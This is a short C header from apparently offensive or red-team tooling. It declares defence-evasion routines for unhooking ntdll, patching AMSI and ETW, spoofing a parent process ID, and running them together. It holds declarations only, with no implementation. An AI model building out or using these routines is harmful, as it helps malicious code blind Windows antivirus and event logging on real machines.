// include/evasion.h
#ifndef EVASION_H
#define EVASION_H
#include <windows.h>

BOOL unhook_ntdll(VOID);
BOOL patch_amsi(VOID);
BOOL patch_etw(VOID);
BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe, PPROCESS_INFORMATION pPi);
BOOL evasion_run(VOID);

#endif